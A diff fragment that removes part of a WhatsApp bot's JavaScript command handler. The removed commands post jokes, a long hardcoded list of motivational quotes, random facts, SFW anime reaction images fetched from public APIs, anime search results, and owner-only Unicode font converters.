-if (data.type === 'single') reply(`╔══════════════════════════╗\n║  😂 *JOKE*\n╚══════════════════════════╝\n\n  ${data.joke}`)
-else reply(`╔══════════════════════════╗\n║  😂 *JOKE*\n╚══════════════════════════╝\n\n  ${data.setup}\n\n  ${data.delivery}`)
-} catch { reply('Could not fetch a joke right now.') }
-} break
-
-case 'quote':
-case 'motivation': {
-    await X.sendMessage(m.chat, { react: { text: '💪', key: m.key } })
-const motivations = [
-// Success & Hard Work
-{ q: "The only way to do great work is to love what you do.", a: "Steve Jobs" },
-{ q: "Success is not final, failure is not fatal: it is the courage to continue that counts.", a: "Winston Churchill" },
-{ q: "Don't watch the clock; do what it does. Keep going.", a: "Sam Levenson" },
-{ q: "The secret of getting ahead is getting started.", a: "Mark Twain" },
-{ q: "It always seems impossible until it's done.", a: "Nelson Mandela" },
-{ q: "Hard work beats talent when talent doesn't work hard.", a: "Tim Notke" },
-{ q: "Success usually comes to those who are too busy to be looking for it.", a: "Henry David Thoreau" },
-{ q: "The difference between ordinary and extraordinary is that little extra.", a: "Jimmy Johnson" },
-{ q: "Opportunities don't happen. You create them.", a: "Chris Grosser" },
-{ q: "Don't be afraid to give up the good to go for the great.", a: "John D. Rockefeller" },
-{ q: "I find that the harder I work, the more luck I seem to have.", a: "Thomas Jefferson" },
-{ q: "There are no shortcuts to any place worth going.", a: "Beverly Sills" },
-{ q: "Success is walking from failure to failure with no loss of enthusiasm.", a: "Winston Churchill" },
-{ q: "The road to success and the road to failure are almost exactly the same.", a: "Colin R. Davis" },
-{ q: "A successful man is one who can lay a firm foundation with the bricks others have thrown at him.", a: "David Brinkley" },
-// Perseverance & Resilience
-{ q: "Fall seven times, stand up eight.", a: "Japanese Proverb" },
-{ q: "The man who moves a mountain begins by carrying away small stones.", a: "Confucius" },
-{ q: "You don't have to be great to start, but you have to start to be great.", a: "Zig Ziglar" },
-{ q: "Our greatest glory is not in never falling, but in rising every time we fall.", a: "Confucius" },
-{ q: "Strength does not come from physical capacity. It comes from an indomitable will.", a: "Mahatma Gandhi" },
-{ q: "Tough times never last, but tough people do.", a: "Robert H. Schuller" },
-{ q: "The darkest hour has only sixty minutes.", a: "Morris Mandel" },
-{ q: "Rock bottom became the solid foundation on which I rebuilt my life.", a: "J.K. Rowling" },
-{ q: "When you reach the end of your rope, tie a knot in it and hang on.", a: "Franklin D. Roosevelt" },
-{ q: "Even the darkest night will end and the sun will rise.", a: "Victor Hugo" },
-{ q: "You may have to fight a battle more than once to win it.", a: "Margaret Thatcher" },
-{ q: "The gem cannot be polished without friction, nor man perfected without trials.", a: "Chinese Proverb" },
-{ q: "Hardships often prepare ordinary people for an extraordinary destiny.", a: "C.S. Lewis" },
-{ q: "Endurance is not just the ability to bear a hard thing, but to turn it into glory.", a: "William Barclay" },
-{ q: "Character cannot be developed in ease and quiet. Only through experience of trial and suffering can the soul be strengthened.", a: "Helen Keller" },
-// Mindset & Growth
-{ q: "Whether you think you can or you think you can't, you're right.", a: "Henry Ford" },
-{ q: "The mind is everything. What you think you become.", a: "Buddha" },
-{ q: "Your life does not get better by chance, it gets better by change.", a: "Jim Rohn" },
-{ q: "The only limit to our realization of tomorrow is our doubts of today.", a: "Franklin D. Roosevelt" },
-{ q: "It is during our darkest moments that we must focus to see the light.", a: "Aristotle" },
-{ q: "Believe you can and you're halfway there.", a: "Theodore Roosevelt" },
-{ q: "You are never too old to set another goal or to dream a new dream.", a: "C.S. Lewis" },
-{ q: "Act as if what you do makes a difference. It does.", a: "William James" },
-{ q: "What we think, we become.", a: "Buddha" },
-{ q: "Keep your face always toward the sunshine, and shadows will fall behind you.", a: "Walt Whitman" },
-{ q: "In the middle of every difficulty lies opportunity.", a: "Albert Einstein" },
-{ q: "We become what we repeatedly do.", a: "Aristotle" },
-{ q: "Change your thoughts and you change your world.", a: "Norman Vincent Peale" },
-{ q: "You have power over your mind, not outside events. Realize this, and you will find strength.", a: "Marcus Aurelius" },
-{ q: "Everything you've ever wanted is on the other side of fear.", a: "George Addair" },
-// Dreams & Vision
-{ q: "The future belongs to those who believe in the beauty of their dreams.", a: "Eleanor Roosevelt" },
-{ q: "Dream big and dare to fail.", a: "Norman Vaughan" },
-{ q: "All our dreams can come true, if we have the courage to pursue them.", a: "Walt Disney" },
-{ q: "The biggest adventure you can take is to live the life of your dreams.", a: "Oprah Winfrey" },
-{ q: "Go confidently in the direction of your dreams. Live the life you have imagined.", a: "Henry David Thoreau" },
-{ q: "A dream doesn't become reality through magic; it takes sweat, determination and hard work.", a: "Colin Powell" },
-{ q: "You are never too old to set another goal or to dream a new dream.", a: "Les Brown" },
-{ q: "Dreams don't work unless you do.", a: "John C. Maxwell" },
-{ q: "The only way to achieve the impossible is to believe it is possible.", a: "Charles Kingsleigh" },
-{ q: "What lies behind us and what lies before us are tiny matters compared to what lies within us.", a: "Ralph Waldo Emerson" },
-// Courage & Action
-{ q: "Courage is not the absence of fear, but action in spite of it.", a: "Mark Twain" },
-{ q: "Do one thing every day that scares you.", a: "Eleanor Roosevelt" },
-{ q: "You miss 100% of the shots you don't take.", a: "Wayne Gretzky" },
-{ q: "The secret to getting ahead is getting started.", a: "Mark Twain" },
-{ q: "Don't count the days, make the days count.", a: "Muhammad Ali" },
-{ q: "Life is short, and it's up to you to make it sweet.", a: "Sarah Louise Delany" },
-{ q: "The way to get started is to quit talking and begin doing.", a: "Walt Disney" },
-{ q: "If you want to live a happy life, tie it to a goal, not to people or things.", a: "Albert Einstein" },
-{ q: "First, think. Then dream. Then dare.", a: "Walt Disney" },
-{ q: "Just do it.", a: "Nike" },
-{ q: "Stop waiting for things to happen. Go out and make them happen.", a: "Unknown" },
-{ q: "You don't need to see the whole staircase, just take the first step.", a: "Martin Luther King Jr." },
-{ q: "Someone is sitting in the shade today because someone planted a tree a long time ago.", a: "Warren Buffett" },
-{ q: "Inaction breeds doubt and fear. Action breeds confidence and courage.", a: "Dale Carnegie" },
-// Purpose & Meaning
-{ q: "He who has a why to live can bear almost any how.", a: "Friedrich Nietzsche" },
-{ q: "The purpose of life is a life of purpose.", a: "Robert Byrne" },
-{ q: "Life is not measured by the number of breaths we take, but by the moments that take our breath away.", a: "Maya Angelou" },
-{ q: "You only live once, but if you do it right, once is enough.", a: "Mae West" },
-{ q: "In the end, it's not the years in your life that count. It's the life in your years.", a: "Abraham Lincoln" },
-{ q: "To live is the rarest thing in the world. Most people exist, that is all.", a: "Oscar Wilde" },
-{ q: "The meaning of life is to find your gift. The purpose of life is to give it away.", a: "Pablo Picasso" },
-{ q: "Don't ask what the world needs. Ask what makes you come alive and go do it.", a: "Howard Thurman" },
-{ q: "Your time is limited, don't waste it living someone else's life.", a: "Steve Jobs" },
-{ q: "Every moment is a fresh beginning.", a: "T.S. Eliot" },
-// Self-Belief
-{ q: "No one can make you feel inferior without your consent.", a: "Eleanor Roosevelt" },
-{ q: "You are enough, a thousand times enough.", a: "Atticus" },
-{ q: "Be yourself; everyone else is already taken.", a: "Oscar Wilde" },
-{ q: "To be yourself in a world that is constantly trying to make you something else is the greatest accomplishment.", a: "Ralph Waldo Emerson" },
-{ q: "You yourself, as much as anybody in the entire universe, deserve your love and affection.", a: "Buddha" },
-{ q: "Knowing yourself is the beginning of all wisdom.", a: "Aristotle" },
-{ q: "The only person you are destined to become is the person you decide to be.", a: "Ralph Waldo Emerson" },
-{ q: "Wherever you go, no matter what the weather, always bring your own sunshine.", a: "Anthony J. D'Angelo" },
-{ q: "With confidence, you have won before you have started.", a: "Marcus Garvey" },
-{ q: "Once you choose hope, anything's possible.", a: "Christopher Reeve" },
-// Leadership & Impact
-{ q: "A leader is one who knows the way, goes the way, and shows the way.", a: "John C. Maxwell" },
-{ q: "Leadership is not about being in charge. It is about taking care of those in your charge.", a: "Simon Sinek" },
-{ q: "The best time to plant a tree was 20 years ago. The second best time is now.", a: "Chinese Proverb" },
-{ q: "Innovation distinguishes between a leader and a follower.", a: "Steve Jobs" },
-{ q: "If your actions inspire others to dream more, learn more, do more and become more, you are a leader.", a: "John Quincy Adams" },
-{ q: "Alone we can do so little; together we can do so much.", a: "Helen Keller" },
-{ q: "The greatest use of a life is to spend it on something that will outlast it.", a: "William James" },
-{ q: "Be the change you wish to see in the world.", a: "Mahatma Gandhi" },
-{ q: "Service to others is the rent you pay for your room here on earth.", a: "Muhammad Ali" },
-// Wisdom & Philosophy  
-{ q: "The unexamined life is not worth living.", a: "Socrates" },
-{ q: "We suffer more in imagination than in reality.", a: "Seneca" },
-{ q: "Waste no more time arguing about what a good man should be. Be one.", a: "Marcus Aurelius" },
-{ q: "You have power over your mind, not outside events.", a: "Marcus Aurelius" },
-{ q: "He who angers you conquers you.", a: "Elizabeth Kenny" },
-{ q: "The quality of a person's life is in direct proportion to their commitment to excellence.", a: "Vince Lombardi" },
-{ q: "Simplicity is the ultimate sophistication.", a: "Leonardo da Vinci" },
-{ q: "The only true wisdom is in knowing you know nothing.", a: "Socrates" },
-{ q: "Patience is bitter, but its fruit is sweet.", a: "Jean-Jacques Rousseau" },
-{ q: "Do not go where the path may lead; go instead where there is no path and leave a trail.", a: "Ralph Waldo Emerson" },
-// Daily Grind
-{ q: "Today's struggle is tomorrow's strength.", a: "Unknown" },
-{ q: "One day or day one. You decide.", a: "Unknown" },
-{ q: "Work hard in silence. Let your success be the noise.", a: "Frank Ocean" },
-{ q: "Stay focused, go after your dreams and keep moving toward your goals.", a: "LL Cool J" },
-{ q: "Push yourself, because no one else is going to do it for you.", a: "Unknown" },
-{ q: "Great things never come from comfort zones.", a: "Unknown" },
-{ q: "Wake up with determination. Go to bed with satisfaction.", a: "Unknown" },
-{ q: "Do something today that your future self will thank you for.", a: "Sean Patrick Flanery" },
-{ q: "Little things make big days.", a: "Unknown" },
-{ q: "It's going to be hard, but hard is not impossible.", a: "Unknown" },
-{ q: "Don't stop when you're tired. Stop when you're done.", a: "Unknown" },
-{ q: "Discipline is choosing between what you want now and what you want most.", a: "Abraham Lincoln" },
-{ q: "Success is the sum of small efforts repeated day in and day out.", a: "Robert Collier" },
-{ q: "Your only limit is your mind.", a: "Unknown" },
-{ q: "Hustle until your haters ask if you're hiring.", a: "Unknown" },
-// Faith & Hope
-{ q: "Faith is taking the first step even when you can't see the whole staircase.", a: "Martin Luther King Jr." },
-{ q: "Hope is the thing with feathers that perches in the soul.", a: "Emily Dickinson" },
-{ q: "God has a plan for your life. Trust the process.", a: "Unknown" },
-{ q: "When nothing goes right, go left.", a: "Unknown" },
-{ q: "Every day may not be good, but there's something good in every day.", a: "Alice Morse Earle" },
-{ q: "You are braver than you believe, stronger than you seem, and smarter than you think.", a: "A.A. Milne" },
-{ q: "The comeback is always stronger than the setback.", a: "Unknown" },
-{ q: "What God has for you, it is for you.", a: "Unknown" },
-{ q: "Storms make trees take deeper roots.", a: "Dolly Parton" },
-{ q: "After every storm, there is a rainbow. If you have eyes to see it.", a: "Paul Walker" }
-]
-let pick = motivations[Math.floor(Math.random() * motivations.length)]
-try {
-let res = await fetch('https://api.quotable.io/random?tags=inspirational|motivational|success|wisdom')
-let data = await res.json()
-if (data?.content && data?.author) {
-pick = { q: data.content, a: data.author }
-}
-} catch {}
-reply(`╔══════════════════════════╗\n║  💫 *MOTIVATION*\n╚══════════════════════════╝\n\n  ❝ ${pick.q} ❞\n\n  — *${pick.a}*`)
-} break
-
-case 'fact': {
-    await X.sendMessage(m.chat, { react: { text: '💡', key: m.key } })
-try {
-let res = await fetch('https://uselessfacts.jsph.pl/api/v2/facts/random')
-let data = await res.json()
-reply(`╔══════════════════════════╗\n║  📚 *RANDOM FACT*\n╚══════════════════════════╝\n\n  ${data.text}`)
-} catch {
-let facts = ['Honey never spoils.', 'Octopuses have three hearts.', 'Bananas are berries but strawberries are not.', 'A group of flamingos is called a flamboyance.', 'The shortest war in history lasted 38 minutes.']
-reply(`╔══════════════════════════╗\n║  📚 *RANDOM FACT*\n╚══════════════════════════╝\n\n  ${facts[Math.floor(Math.random() * facts.length)]}`)
-}
-} break
-
-//━━━━━━━━━━━━━━━━━━━━━━━━//
-// Anime Commands
-case 'neko': {
-    await X.sendMessage(m.chat, { react: { text: '🐱', key: m.key } })
-try {
-let res = await fetch('https://nekos.life/api/v2/img/neko')
-let data = await res.json()
-await X.sendMessage(m.chat, { image: { url: data.url }, caption: '*Neko!* 🐱' }, { quoted: m })
-} catch { reply('Failed to fetch neko image.') }
-} break
-
-case 'waifu': {
-    await X.sendMessage(m.chat, { react: { text: '💕', key: m.key } })
-try {
-let res = await fetch('https://api.waifu.pics/sfw/waifu')
-let data = await res.json()
-await X.sendMessage(m.chat, { image: { url: data.url }, caption: '*Waifu!* 💕' }, { quoted: m })
-} catch { reply('Failed to fetch waifu image.') }
-} break
-
-case 'loli': {
-    await X.sendMessage(m.chat, { react: { text: '🌸', key: m.key } })
-try {
-let res = await fetch('https://nekos.life/api/v2/img/neko')
-let data = await res.json()
-await X.sendMessage(m.chat, { image: { url: data.url }, caption: '*Anime!* 🌸' }, { quoted: m })
-} catch { reply('Failed to fetch image.') }
-} break
-
-case 'nom': {
-    await X.sendMessage(m.chat, { react: { text: '😋', key: m.key } })
-try {
-let res = await fetch('https://api.waifu.pics/sfw/nom')
-let data = await res.json()
-await X.sendMessage(m.chat, { image: { url: data.url }, caption: '*Nom nom!* 😋' }, { quoted: m })
-} catch { reply('Failed to fetch image.') }
-} break
-
-case 'poke': {
-    await X.sendMessage(m.chat, { react: { text: '👉', key: m.key } })
-try {
-let res = await fetch('https://api.waifu.pics/sfw/poke')
-let data = await res.json()
-let pokeTarget = (m.mentionedJid && m.mentionedJid[0]) ? `@${m.mentionedJid[0].split('@')[0]}` : ''
-await X.sendMessage(m.chat, { image: { url: data.url }, caption: `*${pushname} pokes ${pokeTarget || 'someone'}!* 👉`, mentions: m.mentionedJid || [] }, { quoted: m })
-} catch { reply('Failed to fetch image.') }
-} break
-
-case 'cry': {
-    await X.sendMessage(m.chat, { react: { text: '😢', key: m.key } })
-try {
-let res = await fetch('https://api.waifu.pics/sfw/cry')
-let data = await res.json()
-await X.sendMessage(m.chat, { image: { url: data.url }, caption: `*${pushname} is crying!* 😢` }, { quoted: m })
-} catch { reply('Failed to fetch image.') }
-} break
-
-case 'kiss': {
-    await X.sendMessage(m.chat, { react: { text: '😘', key: m.key } })
-try {
-let res = await fetch('https://api.waifu.pics/sfw/kiss')
-let data = await res.json()
-let kissTarget = (m.mentionedJid && m.mentionedJid[0]) ? `@${m.mentionedJid[0].split('@')[0]}` : 'someone'
-await X.sendMessage(m.chat, { image: { url: data.url }, caption: `*${pushname} kisses ${kissTarget}!* 💋`, mentions: m.mentionedJid || [] }, { quoted: m })
-} catch { reply('Failed to fetch image.') }
-} break
-
-case 'pat': {
-    await X.sendMessage(m.chat, { react: { text: '🤝', key: m.key } })
-try {
-let res = await fetch('https://api.waifu.pics/sfw/pat')
-let data = await res.json()
-let patTarget = (m.mentionedJid && m.mentionedJid[0]) ? `@${m.mentionedJid[0].split('@')[0]}` : 'someone'
-await X.sendMessage(m.chat, { image: { url: data.url }, caption: `*${pushname} pats ${patTarget}!* 🤗`, mentions: m.mentionedJid || [] }, { quoted: m })
-} catch { reply('Failed to fetch image.') }
-} break
-
-case 'hug': {
-    await X.sendMessage(m.chat, { react: { text: '🤗', key: m.key } })
-try {
-let res = await fetch('https://api.waifu.pics/sfw/hug')
-let data = await res.json()
-let hugTarget = (m.mentionedJid && m.mentionedJid[0]) ? `@${m.mentionedJid[0].split('@')[0]}` : 'someone'
-await X.sendMessage(m.chat, { image: { url: data.url }, caption: `*${pushname} hugs ${hugTarget}!* 🤗`, mentions: m.mentionedJid || [] }, { quoted: m })
-} catch { reply('Failed to fetch image.') }
-} break
-
-case 'wink': {
-    await X.sendMessage(m.chat, { react: { text: '😉', key: m.key } })
-try {
-let res = await fetch('https://api.waifu.pics/sfw/wink')
-let data = await res.json()
-await X.sendMessage(m.chat, { image: { url: data.url }, caption: `*${pushname} winks!* 😉` }, { quoted: m })
-} catch { reply('Failed to fetch image.') }
-} break
-
-case 'facepalm': {
-    await X.sendMessage(m.chat, { react: { text: '🤦', key: m.key } })
-try {
-let res = await fetch('https://api.waifu.pics/sfw/cringe')
-let data = await res.json()
-await X.sendMessage(m.chat, { image: { url: data.url }, caption: `*${pushname} facepalms!* 🤦` }, { quoted: m })
-} catch { reply('Failed to fetch image.') }
-} break
-
-case 'anime': {
-    await X.sendMessage(m.chat, { react: { text: '🎌', key: m.key } })
-if (!text) return reply(`Example: ${prefix}anime Naruto`)
-try {
-let res = await fetch(`https://api.jikan.moe/v4/anime?q=${encodeURIComponent(text)}&limit=5`)
-let data = await res.json()
-if (!data.data || !data.data.length) return reply('No anime found.')
-let animeList = data.data.map((a, i) => `${i+1}. *${a.title}* (${a.title_japanese || ''})\nScore: ${a.score || 'N/A'}\nEpisodes: ${a.episodes || 'N/A'}\nStatus: ${a.status}\nGenres: ${(a.genres || []).map(g => g.name).join(', ')}\nSynopsis: ${(a.synopsis || 'N/A').slice(0, 200)}...\nURL: ${a.url}`).join('\n\n')
-if (data.data[0].images?.jpg?.image_url) {
-await X.sendMessage(m.chat, { image: { url: data.data[0].images.jpg.image_url }, caption: `*Anime Search: ${text}*\n\n${animeList}` }, { quoted: m })
-} else reply(`╔══════════════════════════╗\n║  🎌 *ANIME SEARCH*\n╚══════════════════════════╝\n\n  🔍 *${text}*\n\n${animeList}`)
-} catch(e) { reply('Error: ' + e.message) }
-} break
-
-//━━━━━━━━━━━━━━━━━━━━━━━━//
-// Unicode Font Commands
-// All outputs are plain Unicode text — everyone sees them in any WhatsApp chat
-// Owner uses the command, copies the output, pastes it anywhere
-case 'setfont': {
-    await X.sendMessage(m.chat, { react: { text: '✏️', key: m.key } })
-// Activate persistent font mode — all your messages auto-convert until you run .fontoff
-if (!isOwner) return reply(mess.OnlyOwner)
-const _validFonts = ['bold','italic','bolditalic','mono','serif','serifbold','serifitalic','scriptfont','scriptbold','fraktur','frakturbold','doublestruck','smallcaps','bubble','bubblebold','square','squarebold','wide','upsidedown','strikethrough','underline','aesthetic','tiny','cursive','gothic','medieval','oldeng','inverted','mirror','currency','dotted','parenthesis','flags']
-let _chosen = (text || '').toLowerCase().trim()
-if (!_chosen) return reply(`*🔤 Set Font Mode*\n\nUsage: ${prefix}setfont [fontname]\n\nAvailable fonts:\n${_validFonts.map(f=>'• '+f).join('\n')}\n\n_Every message you send will auto-convert until you use ${prefix}fontoff_`)
-if (!_validFonts.includes(_chosen)) return reply(`❌ Unknown font: *${_chosen}*\n\nValid options:\n${_validFonts.map(f=>'• '+f).join('\n')}`)
-global.ownerFontMode = _chosen
-reply(`✅ *Font mode set to: ${_chosen}*\n\n_Every message you send will now appear in ${_chosen} style._\n_Use ${prefix}fontoff to return to normal._`)
-} break
-
-case 'fontoff':
-case 'resetfont': {
-    await X.sendMessage(m.chat, { react: { text: '✏️', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-global.ownerFontMode = 'off'
-reply(`✅ *Font mode disabled.*\n_Your messages will now send normally._`)
-} break
-
-case 'font':
-case 'fonts': {
-    await X.sendMessage(m.chat, { react: { text: '🔤', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-reply(`╔══════════════════════════╗\n║  🔤 *FONT CONVERTER*\n╚══════════════════════════╝\n\n  *Classic*\n  ${prefix}bold · ${prefix}italic · ${prefix}bolditalic\n  ${prefix}mono · ${prefix}serif · ${prefix}serifbold\n\n  *Decorative*\n  ${prefix}scriptfont · ${prefix}scriptbold\n  ${prefix}fraktur · ${prefix}frakturbold\n  ${prefix}doublestruck · ${prefix}smallcaps\n\n  *Fun & Stylized*\n  ${prefix}bubble · ${prefix}bubblebold\n  ${prefix}square · ${prefix}squarebold\n  ${prefix}wide · ${prefix}upsidedown\n  ${prefix}strikethrough · ${prefix}underline\n\n  └ ${prefix}allfonts [text] — preview all\n  _Tip: ${prefix}setfont [name] for persistent style_`)
-} break
-
-case 'bold': {
-    await X.sendMessage(m.chat, { react: { text: '𝐁', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let ftIn = text || (m.quoted && (m.quoted.text || m.quoted.body || m.quoted.caption || '').trim()) || ''
-if (!ftIn) return reply(`Usage: ${prefix}bold [text]`)
-const boldMap={a:'𝗮',b:'𝗯',c:'𝗰',d:'𝗱',e:'𝗲',f:'𝗳',g:'𝗴',h:'𝗵',i:'𝗶',j:'𝗷',k:'𝗸',l:'𝗹',m:'𝗺',n:'𝗻',o:'𝗼',p:'𝗽',q:'𝗾',r:'𝗿',s:'𝘀',t:'𝘁',u:'𝘂',v:'𝘃',w:'𝘄',x:'𝘅',y:'𝘆',z:'𝘇',A:'𝗔',B:'𝗕',C:'𝗖',D:'𝗗',E:'𝗘',F:'𝗙',G:'𝗚',H:'𝗛',I:'𝗜',J:'𝗝',K:'𝗞',L:'𝗟',M:'𝗠',N:'𝗡',O:'𝗢',P:'𝗣',Q:'𝗤',R:'𝗥',S:'𝗦',T:'𝗧',U:'𝗨',V:'𝗩',W:'𝗪',X:'𝗫',Y:'𝗬',Z:'𝗭','0':'𝟬','1':'𝟭','2':'𝟮','3':'𝟯','4':'𝟰','5':'𝟱','6':'𝟲','7':'𝟳','8':'𝟴','9':'𝟵'}
-reply([...ftIn].map(c=>boldMap[c]||c).join(''))
-} break
-
-case 'italic': {
-    await X.sendMessage(m.chat, { react: { text: '𝐼', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let ftIn = text || (m.quoted && (m.quoted.text || m.quoted.body || m.quoted.caption || '').trim()) || ''
-if (!ftIn) return reply(`Usage: ${prefix}italic [text]`)
-const italicMap={a:'𝘢',b:'𝘣',c:'𝘤',d:'𝘥',e:'𝘦',f:'𝘧',g:'𝘨',h:'𝘩',i:'𝘪',j:'𝘫',k:'𝘬',l:'𝘭',m:'𝘮',n:'𝘯',o:'𝘰',p:'𝘱',q:'𝘲',r:'𝘳',s:'𝘴',t:'𝘵',u:'𝘶',v:'𝘷',w:'𝘸',x:'𝘹',y:'𝘺',z:'𝘻',A:'𝘈',B:'𝘉',C:'𝘊',D:'𝘋',E:'𝘌',F:'𝘍',G:'𝘎',H:'𝘏',I:'𝘐',J:'𝘑',K:'𝘒',L:'𝘓',M:'𝘔',N:'𝘕',O:'𝘖',P:'𝘗',Q:'𝘘',R:'𝘙',S:'𝘚',T:'𝘛',U:'𝘜',V:'𝘝',W:'𝘞',X:'𝘟',Y:'𝘠',Z:'𝘡'}
-reply([...ftIn].map(c=>italicMap[c]||c).join(''))
-} break
-
-case 'bolditalic': {
-    await X.sendMessage(m.chat, { react: { text: '𝑩', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let ftIn = text || (m.quoted && (m.quoted.text || m.quoted.body || m.quoted.caption || '').trim()) || ''
-if (!ftIn) return reply(`Usage: ${prefix}bolditalic [text]`)
-const biMap={a:'𝙖',b:'𝙗',c:'𝙘',d:'𝙙',e:'𝙚',f:'𝙛',g:'𝙜',h:'𝙝',i:'𝙞',j:'𝙟',k:'𝙠',l:'𝙡',m:'𝙢',n:'𝙣',o:'𝙤',p:'𝙥',q:'𝙦',r:'𝙧',s:'𝙨',t:'𝙩',u:'𝙪',v:'𝙫',w:'𝙬',x:'𝙭',y:'𝙮',z:'𝙯',A:'𝘼',B:'𝘽',C:'𝘾',D:'𝘿',E:'𝙀',F:'𝙁',G:'𝙂',H:'𝙃',I:'𝙄',J:'𝙅',K:'𝙆',L:'𝙇',M:'𝙈',N:'𝙉',O:'𝙊',P:'𝙋',Q:'𝙌',R:'𝙍',S:'𝙎',T:'𝙏',U:'𝙐',V:'𝙑',W:'𝙒',X:'𝙓',Y:'𝙔',Z:'𝙕'}
-reply([...ftIn].map(c=>biMap[c]||c).join(''))
-} break
-
-case 'mono': {
-    await X.sendMessage(m.chat, { react: { text: '𝙼', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let ftIn = text || (m.quoted && (m.quoted.text || m.quoted.body || m.quoted.caption || '').trim()) || ''
-if (!ftIn) return reply(`Usage: ${prefix}mono [text]`)
-const monoMap={a:'𝚊',b:'𝚋',c:'𝚌',d:'𝚍',e:'𝚎',f:'𝚏',g:'𝚐',h:'𝚑',i:'𝚒',j:'𝚓',k:'𝚔',l:'𝚕',m:'𝚖',n:'𝚗',o:'𝚘',p:'𝚙',q:'𝚚',r:'𝚛',s:'𝚜',t:'𝚝',u:'𝚞',v:'𝚟',w:'𝚠',x:'𝚡',y:'𝚢',z:'𝚣',A:'𝙰',B:'𝙱',C:'𝙲',D:'𝙳',E:'𝙴',F:'𝙵',G:'𝙶',H:'𝙷',I:'𝙸',J:'𝙹',K:'𝙺',L:'𝙻',M:'𝙼',N:'𝙽',O:'𝙾',P:'𝙿',Q:'𝚀',R:'𝚁',S:'𝚂',T:'𝚃',U:'𝚄',V:'𝚅',W:'𝚆',X:'𝚇',Y:'𝚈',Z:'𝚉','0':'𝟶','1':'𝟷','2':'𝟸','3':'𝟹','4':'𝟺','5':'𝟻','6':'𝟼','7':'𝟽','8':'𝟾','9':'𝟿'}
-reply([...ftIn].map(c=>monoMap[c]||c).join(''))
-} break
-
-case 'serif': {
-    await X.sendMessage(m.chat, { react: { text: '𝐒', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let ftIn = text || (m.quoted && (m.quoted.text || m.quoted.body || m.quoted.caption || '').trim()) || ''
-if (!ftIn) return reply(`Usage: ${prefix}serif [text]`)
-const serifMap={a:'𝐚',b:'𝐛',c:'𝐜',d:'𝐝',e:'𝐞',f:'𝐟',g:'𝐠',h:'𝐡',i:'𝐢',j:'𝐣',k:'𝐤',l:'𝐥',m:'𝐦',n:'𝐧',o:'𝐨',p:'𝐩',q:'𝐪',r:'𝐫',s:'𝐬',t:'𝐭',u:'𝐮',v:'𝐯',w:'𝐰',x:'𝐱',y:'𝐲',z:'𝐳',A:'𝐀',B:'𝐁',C:'𝐂',D:'𝐃',E:'𝐄',F:'𝐅',G:'𝐆',H:'𝐇',I:'𝐈',J:'𝐉',K:'𝐊',L:'𝐋',M:'𝐌',N:'𝐍',O:'𝐎',P:'𝐏',Q:'𝐐',R:'𝐑',S:'𝐒',T:'𝐓',U:'𝐔',V:'𝐕',W:'𝐖',X:'𝐗',Y:'𝐘',Z:'𝐙','0':'𝟎','1':'𝟏','2':'𝟐','3':'𝟑','4':'𝟒','5':'𝟓','6':'𝟔','7':'𝟕','8':'𝟖','9':'𝟗'}
-reply([...ftIn].map(c=>serifMap[c]||c).join(''))
-} break
-
-case 'serifbold': {
-    await X.sendMessage(m.chat, { react: { text: '𝐒', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let ftIn = text || (m.quoted && (m.quoted.text || m.quoted.body || m.quoted.caption || '').trim()) || ''
-if (!ftIn) return reply(`Usage: ${prefix}serifbold [text]`)
-const sbMap={a:'𝐚',b:'𝐛',c:'𝐜',d:'𝐝',e:'𝐞',f:'𝐟',g:'𝐠',h:'𝐡',i:'𝐢',j:'𝐣',k:'𝐤',l:'𝐥',m:'𝐦',n:'𝐧',o:'𝐨',p:'𝐩',q:'𝐪',r:'𝐫',s:'𝐬',t:'𝐭',u:'𝐮',v:'𝐯',w:'𝐰',x:'𝐱',y:'𝐲',z:'𝐳',A:'𝐀',B:'𝐁',C:'𝐂',D:'𝐃',E:'𝐄',F:'𝐅',G:'𝐆',H:'𝐇',I:'𝐈',J:'𝐉',K:'𝐊',L:'𝐋',M:'𝐌',N:'𝐍',O:'𝐎',P:'𝐏',Q:'𝐐',R:'𝐑',S:'𝐒',T:'𝐓',U:'𝐔',V:'𝐕',W:'𝐖',X:'𝐗',Y:'𝐘',Z:'𝐙'}
-reply([...ftIn].map(c=>sbMap[c]||c).join(''))
-} break
-
-case 'serifitalic': {
-    await X.sendMessage(m.chat, { react: { text: '𝑆', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let ftIn = text || (m.quoted && (m.quoted.text || m.quoted.body || m.quoted.caption || '').trim()) || ''
-if (!ftIn) return reply(`Usage: ${prefix}serifitalic [text]`)
-const siMap={a:'𝑎',b:'𝑏',c:'𝑐',d:'𝑑',e:'𝑒',f:'𝑓',g:'𝑔',h:'ℎ',i:'𝑖',j:'𝑗',k:'𝑘',l:'𝑙',m:'𝑚',n:'𝑛',o:'𝑜',p:'𝑝',q:'𝑞',r:'𝑟',s:'𝑠',t:'𝑡',u:'𝑢',v:'𝑣',w:'𝑤',x:'𝑥',y:'𝑦',z:'𝑧',A:'𝐴',B:'𝐵',C:'𝐶',D:'𝐷',E:'𝐸',F:'𝐹',G:'𝐺',H:'𝐻',I:'𝐼',J:'𝐽',K:'𝐾',L:'𝐿',M:'𝑀',N:'𝑁',O:'𝑂',P:'𝑃',Q:'𝑄',R:'𝑅',S:'𝑆',T:'𝑇',U:'𝑈',V:'𝑉',W:'𝑊',X:'𝑋',Y:'𝑌',Z:'𝑍'}
-reply([...ftIn].map(c=>siMap[c]||c).join(''))
-} break
-
-case 'scriptfont': {
-    await X.sendMessage(m.chat, { react: { text: '𝒮', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let ftIn = text || (m.quoted && (m.quoted.text || m.quoted.body || m.quoted.caption || '').trim()) || ''
-if (!ftIn) return reply(`Usage: ${prefix}scriptfont [text]`)
